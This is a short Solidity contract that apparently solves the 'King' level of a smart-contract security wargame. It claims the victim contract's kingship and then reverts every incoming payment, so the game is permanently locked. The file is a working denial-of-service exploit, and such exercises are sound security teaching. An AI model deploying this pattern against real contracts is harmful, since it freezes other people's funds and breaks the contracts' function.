// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/IKing.sol";

contract KingAttack {
    IKing private immutable victimKing;

    constructor(IKing victimKing_) {
        victimKing = victimKing_;
    }

    function attack() external payable {
        require(msg.value >= victimKing.prize(), "King: Value must be gt|eq prize");

        // solhint-disable-next-line avoid-low-level-calls
        (bool isSuccess, ) = address(victimKing).call{ value: msg.value }("");

        require(isSuccess, "King: Call error");

        require(address(this) == victimKing._king() && msg.value == victimKing.prize(), "King: Attack failed");
    }

    receive() external payable {
        revert("King: Level passed");
    }
}
